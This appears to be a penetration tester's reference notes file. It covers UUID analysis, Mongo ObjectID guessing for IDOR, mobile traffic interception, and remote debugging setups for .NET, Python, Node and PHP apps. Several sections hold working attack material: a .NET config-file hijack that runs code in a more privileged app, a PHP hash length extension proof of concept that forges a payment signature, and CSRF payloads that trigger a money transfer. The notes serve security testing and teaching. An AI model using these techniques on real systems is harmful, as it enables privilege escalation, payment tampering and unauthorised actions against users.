# Hints about specific topics with detailed explanation

> **Note**: Use the TOC provided by the GitHub MD file rendering named `Outline`.

## UUID explanation and vulnerabilities

> **Note**:
> This [script](../scripts/identify-uuids.sh) can be used to extract and analyze all UUIDs in a code base and this [script](../scripts/attack-uuidv3v5.py) can be used to attack a UUID v3 or v5 via brute force.

👀 See the following PDF documents:

* [UUID explained n°1](UUID_explained1.pdf)
* [UUID explained n°2](UUID_explained2.pdf)

:dash: `grep` useful command lines related to UUID search and analysis:

```shell
# Extract all UUID from a code base excluding test related files
$ grep -Por ".*[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}.*" * | grep -iv test | grep -Po "[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}" | sort -u
320e6aaf-b9d6-4e01-b092-075c29519524
a5268b64-a499-4fff-b8b7-83b9de77db06
ed0a336d-5006-449e-92d6-7b7eb2a2a769
c587b464-2c71-43c7-8bd4-309f2f25ba03
9c3e9fef-f20f-41c2-91a1-d1c2ed3c50a7
b306dbf1-f172-414c-996c-2592ba7d8e38
2aae4edc-bc51-436c-af04-76307825aaa2
...

# Extract all UUID from a code base excluding test related files and display the versions of the UUIDs
$ grep -Por ".*[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}.*" * | grep -iv test | grep -Po "[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}" | cut -d'-' -f3 | cut -c1 | sort -u
1
4
5
```

## TOTP algorithm

> TOTP stands for **T**ime-Based **O**ne-**T**ime **P**assword.

![TOTP_algorithm](TOTP_algorithm2.jpg)

👀 See the following tutorials:

* [How Google Authenticator Works?](TOTP_algorithm1.pdf)
* [security.stackexchange.com post](https://security.stackexchange.com/a/135953) (source of the figure above).

## Hijack .NET app processing flow via its config

* [Demonstration](POCDotNetAppFlowHijackingViaConfig.mp4).
* [Visual Studio project for the assembly](POCDotNetAppFlowHijackingViaConfig-ProjectTemplate.zip).
* [App configuration schema documentation](https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/).

**Context:**

1. A .NET app run with a more privilege user than my current user like for example a Windows service.
2. This app is installed in a folder in which my current user can create new files.
3. The configuration file associated to the app and, named `[APPNAME].exe.config`, is not present in the folder.
4. The app performs some HTTP/FTP requests.

**Then:**

It is possible to hijack the HTTP/FTP call flow in order to execute custom code, by performing these 2 steps:

1. Create a assembly with a class implementing the interface [System.Net.IWebRequestCreate](https://docs.microsoft.com/en-us/dotnet/api/system.net.iwebrequestcreate?view=net-5.0).
2. Put the custom code in the overrided method named `Create(Uri uri)`. Example of class code:

```csharp
using System;
using System.IO;
using System.Net;
using System.Security.Principal;

namespace ClassLibrary
{
    public class MyModule : IWebRequestCreate
    {
        private string tmpFileName = null;

        public MyModule()
        {
            this.tmpFileName = Path.GetTempPath() + "MyModule.txt";
            string msg = "MyModule::Init::" + WindowsIdentity.GetCurrent().Name;
            TraceCall(msg);
        }
        public WebRequest Create(Uri uri)
        {
            string msg = "MyModule::Create::" + WindowsIdentity.GetCurrent().Name;
            TraceCall(msg);
            //Cause a System.NullReferenceException but do not care here...
            return null;
        }

        private void TraceCall(string msg)
        {
            Console.WriteLine(msg);
            if (!File.Exists(tmpFileName))
            {
                using (StreamWriter sw = File.CreateText(tmpFileName))
                {
                    sw.WriteLine(msg);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(this.tmpFileName))
                {
                    sw.WriteLine(msg);
                }
            }
        }
    }
}
```

3. Create a [strong-named configuration](https://docs.microsoft.com/en-us/dotnet/standard/assembly/create-use-strong-named) for the assembly with Visual Studio:

![strong-named configuration](POCDotNetAppFlowHijackingViaConfig.png)

4. Compile and sign the assembly to a dll file: Ensure to match the .NET framework version used by the target application.
5. Copy the assembly dll file in the same folder than the target application.
6. Create the file `[APPNAME].exe.config` in the same folder than the target application with the following block `<webRequestModules>...</webRequestModules>` content (update the assembly info in case of need):

```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <!-- ... -->
  <system.net>
    <webRequestModules>
      <!-- Drop all existing defined handler -->
      <clear/>
      <!-- Declare a handler for the FTP protocol using our assembly to execute arbitrary code -->
      <add prefix="ftp" type="ClassLibrary.MyModule, ClassLibrary, Version=1.0.0.0, Culture=neutral, PublicKeyToken=a4de98bf5421a887"/>
    </webRequestModules>
  </system.net>
</configuration>
```

:speech_balloon: To get the info block `Version=1.0.0.0, Culture=neutral, PublicKeyToken=a4de98bf5421a887` of the assembly, just open the dll file with [DNSpy](https://github.com/dnSpy/dnSpy).

7. Execute the target application: When the app will made any HTTP/FTP request (FTP in the config above) then the code of the assembly will be triggered.

## Mongo ObjectID and IDOR

> **Note**: **3.4+** means versions >= 3.4 and **3.2-** means versions <= 3.2.

* [Blog post on the topic](https://www.mickaelwalter.fr/idor-with-mongodb-understanding-objectid/).
* [Explanation about IDOR](https://portswigger.net/web-security/access-control/idor).
* [Tool to generate ObjectID for Mongo DB server 3.4+ format](../scripts/generate-mongodb-potential-object-identifiers.py).
* [Tool to generate ObjectID for Mongo DB server 3.2- format](https://github.com/andresriancho/mongo-objectid-predict) (:warning: it is a python 2 script).

📑 Assuming the following list of gathered Mongo ObjectID - always **12 bytes** length otherwise is not a Mongo ObjectID:

```text
507f1f77bcf86cd7994390af
507f1fc5bcf86cd7994390c4
507f1fdabcf86cd7994390f5
```

📖 ObjectID structure in [Mongo DB Server 3.4+](https://www.mongodb.com/docs/manual/reference/method/ObjectId/) is the following:

1) a **4-byte** timestamp value, representing the **ObjectId**’s creation, measured in seconds since the Unix epoch.
2) a **5-byte** random value generated once per process. This random value is unique to the machine and process.
3) a **3-byte** incrementing counter, initialized to a random value.

ObjectID structure in [Mongo DB server 3.2-](https://docs.mongodb.com/v3.2/reference/method/ObjectId/) is the following:

1) a **4-byte** value representing the seconds since the Unix epoch.
2) a **3-byte** machine identifier.
3) a **2-byte** process id.
4) a **3-byte** counter, starting with a random value.

So, if we try to split ObjectID content by isolating patterns, we obtains the following groups:

```text
507f1f77 bcf86c d799 4390af
507f1fc5 bcf86c d799 4390c4
507f1fda bcf86c d799 4390f5
```

As the block `bcf86c d799` stay stable accross gathered ObjectID then it seems to be a *Machine ID* and a *Process ID*, normally stable in mono instance deployment. So here, the Mongo DB Server seems to be a *3.2-* one.

IDOR here can be tried on parts (bytes) represented with **x**  knowing that the first set of **x** is a timestamp in [epoch](https://en.wikipedia.org/wiki/Unix_time) format: `507f1fxx bcf86c d799 xxxxxx`

For the last set of x (whatever the version of mongo db), there is no need to pass by the decimal representation. Indeed, as the original data is in HEX then the HEX range `a-f0-9` is shorter to evaluate for each of the 3 bytes (assuming that this whole section must be guessed because, initially, it is a counter): `16^6 possibilities for the random part of the ObjectID`

Python code snippet to work with the ObjectID:

```shell
# 507f1f77 bcf86c d799 4390c4
$ python
>>> from datetime import datetime
>>> int("507f1f77", 16)
1350508407
>>> int("4390c4", 16)
4427972
>>> datetime.fromtimestamp(1350508407)
datetime.datetime(2012, 10, 17, 23, 13, 27)
```

## Interacting with a Message Oriented Middleware system

> IBM MQSERIES is used here as an example because it's the one I often meet.

* [MQSERIES clients](https://www.ibm.com/support/pages/mqc91-ibm-mq-clients)
* [MQSERIES java client api javadoc](https://www.ibm.com/docs/api/v1/content/SSFKSJ_8.0.0/com.ibm.mq.javadoc.doc/WMQJavaClasses/index.html)
* [MQSERIES java code sample](https://github.com/ibm-messaging/mq-dev-samples)
* [MQSERIES free instance](https://developer.ibm.com/tutorials/mq-connect-app-queue-manager-containers/)

The following elements can be used.

💻 For manual inspection, generally to find a way to connect to a queue manager :

* [MQSeriesUtils.java](../scripts/MQSeriesUtils.java) (refer to comments for usage).

💻 For common and more larger operation, once connection to a queue manager was obtained:

* [JMS toolbox](https://github.com/jmstoolbox/jmstoolbox)
* [IBM MQ Explorer via a Eclipse extension](http://marketplace.eclipse.org/content/ibm-mq-explorer-version-92)

## MITM on a mobile via OpenVPN

* [Documentation 1](https://blog.nviso.eu/2020/06/12/intercepting-flutter-traffic-on-ios/).
* [Documentation 2](https://www.triskelelabs.com/intercepting-xamarin-mobile-app-traffic-2).

💻 Requirements:

* Debian VM in **Bridge network mode** on an **non-guest isolation Wifi** with Internet access.
  * Packages: `apt install python3 curl wget`.
* Network interface on the VM is named **ens33**.
* Burp CE installed on the VM.

Follow these steps based on the documentation aboves and personal labs:

**On the VM:**

1. Use this [script](https://github.com/Nyr/openvpn-install) to install and later manage OpenVPN instance + client profiles.
    * Use the IP of the VM as **Public IPv4 address**.
    * Use **UDP procol** with **default port** proposed.
    * Use **1.1.1.1** for the DNS server.
    * My client profile was named **mobvpn**.
2. Once installed, export the Burp CA certifcate in **DER format** in the **/root** folder as **burp.crt** file (alongside the client profile file named **mobvpn.ovpn**).
3. Expose the **/root** folder via web via the command: `python3 -m http.server 8080 --directory /root/`

**On the mobile:**

1. Connect the mobile to the same Wifi than the VM.
2. Install the [OpenVPN application](https://apps.apple.com/us/app/openvpn-connect/id590379981).
3. Open the url `http://[VM]:8080/mobvpn.ovpn` in Safari and [open the profile with the OpenVPN application](https://blog.nviso.eu/2020/06/12/intercepting-flutter-traffic-on-ios/) to install it:

![MITMMobileOpenVPN_Profile.png](MITMMobileOpenVPN_Profile.png)

4. Open the url `http://[VM]:8080/burp.crt` in Safari and fully install the profile and trust the Burp CA:

![MITMMobileOpenVPN_BurpCA1.png](MITMMobileOpenVPN_BurpCA1.png) ![MITMMobileOpenVPN_BurpCA2.png](MITMMobileOpenVPN_BurpCA2.png)

**On the VM:**

1. Stop the python listener.
2. Start burp and define it as transparent proxy listening on **port 8888** on **all interfaces** (set **Intercept** button to **off**):

![MITMMobileOpenVPN_BurpProxy1.png](MITMMobileOpenVPN_BurpProxy1.png)

![MITMMobileOpenVPN_BurpProxy2.png](MITMMobileOpenVPN_BurpProxy2.png)

3. Execute the following commands to setup the network redirection:

Replace `192.168.178.0/24` by the Wifi CDIR. Added rules are removed once the VM is restarted.

```bash
iptables -t nat -A PREROUTING -i tun0 -p tcp --dport 80 -j REDIRECT --to-port 8888
iptables -t nat -A PREROUTING -i tun0 -p tcp --dport 443 -j REDIRECT --to-port 8888
iptables -t nat -A POSTROUTING -s 192.168.178.0/24 -o ens33 -j MASQUERADE
sysctl -w net.ipv4.ip_forward=1
sysctl -w net.ipv6.conf.all.forwarding=1
sysctl -w net.ipv4.conf.all.send_redirects=0
iptables -t nat -L
```

**On the mobile:**

In OpenVP application, start the connection and test some HTTP/HTTPS url with Safari to very that interception is OK:

![MITMMobileOpenVPN_FinalTest1.png](MITMMobileOpenVPN_FinalTest1.png)

![MITMMobileOpenVPN_FinalTest2.png](MITMMobileOpenVPN_FinalTest2.png)

## Hash length extension attacks

### Context of the vulnerability

1. An application is susceptible to a hash length extension attack if it prepends a secret value to a string, hashes it with a vulnerable algorithm,and entrusts the attacker with both the string and the hash, but not the secret.
2. Then, the server relies on the secret to decide whether or not the data returned later is the same as the original data.

📍 If the length of the secret is know then it is better but if it is not the case then can be brute forced.

💡 Hashing algorithms MD2, SHA-224, and SHA-384 are not vulnerable but MD4, MD5, RIPEMD-160, SHA-0, SHA-1, SHA-256, SHA-512, WHIRLPOOL are vulnerable.

### Root cause of the vulnerability

Usage of a simple **hash** to ensure **the integrity** of a protected data.

### Remediation

Use **HMAC** instead of a simple **hash** to create a signature using symmetric secret.

### Vulnerable code sample to show the issue

```php
function sign_payment($payment_infos)
{
    //compute signature to ensure the payment details 
 //cannot be tampered with
    $secret = "577f5742-dc11-48bd-b6e9-ff96fbdf0d92";
    $data = $secret . $payment_infos;
    return hash("sha256", $data);
}

function verify_signature($payment_infos, $payment_signature)
{
    return strcmp(sign_payment($payment_infos),  $payment_signature);
}
```

### Code of demonstration of the problem

```php
$payment_original_infos = "data";
$payment_signature = sign_payment($payment_original_infos);
$payment_signature_verification = verify_signature($payment_original_infos, $payment_signature);
$payment_altered_infos = "data\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x40append";
$payment_altered_signature = "0bd7717d818989b3625f6b3e4c6a9002ed07fb4b943a0704e0fb348a21e1a9f8";
$payment_altered_signature_verification = verify_signature($payment_altered_infos, $payment_altered_signature);

print("payment_original_infos : $payment_original_infos\n");
print("payment_signature      : $payment_signature\n");
if ($payment_signature_verification === 0 && $payment_altered_signature_verification === 0) {
    print("Alteration accepted!\n");
}
```

The value of `$payment_altered_infos` and `$payment_altered_signature` were obtained using the tool [hash_extender](https://github.com/iagox86/hash_extender) via the following command line:

```bash
# Options used:
# --data: The original string that we're going to extend.
# -s: The original signature.
# -a: The data to append to the string
# -l: The length of the secret
# -f: The hash_type of the signature
# --out-data-format: Output data format
$ hash_extender --data "data" -s "f77f59bb37ec13a961dd1f5abe289dd8f7b6ae664b97a5d64c6c625f7dacea58" -a "append" -l 36 -f sha256 --out-data-format=cstr
    Type: sha256     
    Secret length: 36
    New signature: 0bd7717d818989b3625f6b3e4c6a9002ed07fb4b943a0704e0fb348a21e1a9f8
    New string: data\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x40append
```

Execution of the POC:

```bash
$ php test.php 
payment_original_infos : data
payment_signature      : f77f59bb37ec13a961dd1f5abe289dd8f7b6ae664b97a5d64c6c625f7dacea58
Alteration accepted!
```

### Sources

Primary (best one):

* <https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks>

Additional:

* <https://en.wikipedia.org/wiki/Length_extension_attack>
* <https://www.slideshare.net/exploresecurity/hash-length-extension-attacks>
* <https://d0nut.medium.com/week-17-hash-length-extensions-7f7e02e62fb5>

### Exploitation tool

> **Note**: Latest Linux binary of the **hash_extender** tool is build every day, via this [workflow](https://github.com/righettod/toolbox-pentest-web/actions/workflows/build_hash_extender_binary.yml), and built content is attached to the build.

* Main: <https://github.com/iagox86/hash_extender>
* Fallback: <https://github.com/bwall/HashPump>

## SameSite cookie tips

> **Note**: Tips below are taken from the [PortSwigger CSRF online course](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions).

💡 In the context of *SameSite cookie restrictions*, a site is defined as the `Top-Level Domain` (**TLD**), usually something like `.com` or `.net`, plus one additional level of the domain name. This is often referred to as the **TLD+1**.

💡 You may come across the term `effective Top-Level Domain` (**eTLD**). This is just a way of accounting for the reserved multipart suffixes that are treated as top-level domains in practice, such as `.co.uk`.

### When LAX policy is applied

* As long as the request involves a top-level navigation, the browser will still include the victim's session cookie. The following is one of the simplest approaches to launching such an attack:

```html
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

* Even if an ordinary GET request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the _method parameter in forms, which takes precedence over the normal method for routing purposes:

```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

💡 You can use this [dictionary](https://github.com/PortSwigger/param-miner/blob/master/resources/params) for a list of possible parameter names.

* Cookies with `SameSite=Lax` restrictions aren't normally sent in any cross-site POST requests, but there are some exceptions. To avoid breaking single sign-on (SSO) mechanisms, **Chrome** doesn't actually enforce these restrictions **at all for the first 120 seconds after a cookie is set**. As a result, there is a two-minute window in which users may be susceptible to cross-site attacks. The following code can be used to cause a *top-level navigation*, which ensures that the cookies associated with their current session are included:

```javascript
//This way, the window.open() method is only invoked when the user clicks somewhere on the page.
//As this is the result of a manual interaction, the browser allows the popup. 
window.onclick = () => { window.open('https://vulnerable-website.com/path-issuing-target-cookie'); }
```

### When STRICT policy is applied

* If a cookie is set with the `SameSite=Strict` attribute, browsers won't include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site like for example a DOM based open redirect.
* Whether you're testing someone else's website or trying to secure your own, it's essential to keep in mind that a request can still be same-site even if it's issued cross-origin. It is the case for sibling domains:
  * A cookie set by a response from `https://app.example.com` will be send for a request to `https://intranet.example.com` because they are both considered Same-Site.

## Debug a DotNet web app with DNSpy

💻 Debug instruction:

```csharp
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
```

💻 Procedure:

1. Using DNSpy: Add the **debug instruction** to the target assembly in the app install directory and save the assembly module.
2. Remove the assembly from DNSpy
3. Restart IIS via `iisreset /noforce` to ensure that the assembly will be copied by the worker in its working folder.
4. Access the application home page in order to instruct IIS to initiate a worker.
5. Using DNSpy: Open the assembly file from the worker working folder.
6. Using DNSpy: Attach to the process *w3wp.exe* (IIS worker process) via *Debug > Attach to Process...* menu.
7. Using DNSpy: Pause (*Break All*) the debugging.
8. Using DNSpy: Open all module via *Debug > Windows > Modules* menu, right-click on a module and click on *Open All Modules*.
9. Using DNSpy: Choose a location and set a breakpoint.
10. Using DNSpy: Click on *Continue* to resume the debugging.
11. Access the application to trigger the breakpoint.

## Debug a Python web app with VSCode

### Step 1

💻 Add the following code in the starting point of the application as first statement before the application start in order to start it allowing to attach a debugger to it:

:information_source: [PTVSD documentation](https://github.com/microsoft/ptvsd)

```python
###### Start the debugger on port 5678
## Dependency: pip install ptvsd
import ptvsd
ptvsd.enable_attach(redirect_output=True)
print("Now ready for the IDE to connect to the debugger on port 5678")
ptvsd.wait_for_attach()
#########################################################################
```

💻 Example in a Flask application:

```python
from flask import Flask, request

###### Start the debugger on port 5678
import ptvsd
ptvsd.enable_attach(redirect_output=True)
print("Now ready for the IDE to connect to the debugger on port 5678")
ptvsd.wait_for_attach()
#########################################################################

app = Flask(__name__)

@app.route('/', methods=['GET'])
def call():
    print("[+] Call")
    return "OK"
 
app.run(host='0.0.0.0', port=8000)
```

### Step 2

💻 In the VSCode project, add the following content in the file `.vscode/launch.json` to define the *run and debug* configuration:

:warning: Adjust the **remoteRoot** attribute to the target deployment absolute folder path!

```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "name": "Python Remote Attach To Debugger",
            "type": "python",
            "request": "attach",
            "connect": {
                "host": "10.10.10.10",
                "port": 5678
            },
            "pathMappings": [
                {
                    "localRoot": "${workspaceFolder}",
                    "remoteRoot": "."
                }
            ]
        }
    ]
}
```

### Step 3

1. Run the application on the server.
2. Launch the debug configuration in VSCode.
3. If all goes well, the debugger will be attached and breakpoint can be created/triggered.

:triangular_flag_on_post: If the error `Only one usage of each socket address (protocol/network address/port) is normally permitted` is raised during the start of the app then change the attach port via the following syntax:

```python
ptvsd.enable_attach(address=("10.10.10.10", 8200), redirect_output=True)
```

## Debug a NodeJS web app with VSCode

### Step 1

💻 Start application in debug mode:

:information_source: [Command line options for the debug mode](https://nodejs.org/en/docs/guides/debugging-getting-started/#command-line-options)

```shell
$ node --inspect=10.10.10.10:9229 app.js
Debugger listening on ws://10.10.10.10:9229/dbc78b68-7d9d-46e6-b501-b3110dd6c04d
For help, see: https://nodejs.org/en/docs/inspector
```

### Step 2

:information_source: [Remote debugging configuration options](https://code.visualstudio.com/docs/nodejs/nodejs-debugging#_remote-debugging)

:information_source: Notes about the `localRoot` and `remoteRoot` configuration options taken from the link above:

> By default, VSCode will stream the debugged source from the remote Node.js folder to the local VSCode and show it in a **read-only** editor.

> You can step through this code, but cannot modify it. If you want VSCode to open the editable source from your workspace instead, you can setup a mapping between the remote and local locations.

> A `localRoot` and a `remoteRoot` attribute can be used to map paths between a local VSCode project and a (remote) Node.js folder. This works even locally on the same system or across different operating systems. Whenever a code path needs to be converted from the remote Node.js folder to a local VS Code path, the `remoteRoot` path is stripped off the path and replaced by `localRoot`. For the reverse conversion, the `localRoot` path is replaced by the `remoteRoot`.

💡 Use the `"localRoot": "${workspaceFolder}"` option to point local sources to the workspace location.

💻 In the VSCode project, add the following content in the file `.vscode/launch.json` to define the *run and debug* configuration:

```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "address": "10.10.10.10",
            "name": "NodeJS Remote Attach To Debugger",
            "port": 9229,
            "request": "attach",
            "skipFiles": [
                "<node_internals>/**"
            ],
            "type": "pwa-node"
        }
    ]
}
```

### Step 3

1. Launch the debug configuration in VSCode.
2. If all goes well, the debugger will be attached and breakpoint can be created/triggered.

## Debug a PHP web app with VSCode

### Step 1

:information_source: [XDebug documentation](https://xdebug.org/docs/install)

:triangular_flag_on_post: In this debug mode, it's XDebug that will connect back to the debug listener started by VSCode when a PHP remote script is called.

:warning: Ensure that the following lines are present into the `php.ini` configuration file used by the server in order to ensure that XDebug is installed/configured:

```ini
; ...
zend_extension = [FULL_PATH_TO_THE_XDEBUG_LIBRARY_SO_OR_DLL_FILE]
; ...
[XDebug]
xdebug.remote_enable = true
xdebug.remote_autostart = true
xdebug.remote_connect_back = true
xdebug.remote_port = 8000
```

### Step 2

:warning: Adjust the `[REMOTE_ROOT]` marker to the target deployment absolute folder path!

:warning: Ensure that the server can connect to the IP/PORT specified in the `php.ini` file as well as the VSCode debug configuration!

1. Install the VSCode extension *[PHP Debug](https://marketplace.visualstudio.com/items?itemName=felixfbecker.php-debug)*.
2. In the VSCode project, add the following content in the file `.vscode/launch.json` to define the *run and debug* configuration:

```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "name": "Listen for XDebug incoming connection",
            "type": "php",
            "request": "launch",
            "hostname": "10.10.10.10",
            "port": 8000,
            "log": true,
            "pathMappings": {
                "[REMOTE_ROOT]": "${workspaceRoot}"
              }
        }
    ]
}
```

### Step 3

1. Launch the debug configuration in VSCode.
2. Set a breakpoint.
3. Call the remote PHP script via the browser or a HTTP client.
4. If all goes well, the  breakpoint will be triggered.
